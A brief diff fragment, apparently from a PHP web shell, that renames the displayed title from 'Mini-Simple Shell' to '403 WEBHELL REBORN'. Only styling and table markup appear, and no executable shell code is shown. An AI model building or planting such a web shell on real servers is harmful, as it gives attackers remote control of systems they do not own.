@@ -90,7 +90,7 @@ option {
 }
 </style>
 <center>
-<font face="Bungee" size="5">Mini-Simple Shell</font></center>
+<font face="Bungee" size="5">403 WEBHELL REBORN</font></center>
 <table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>
 <?php
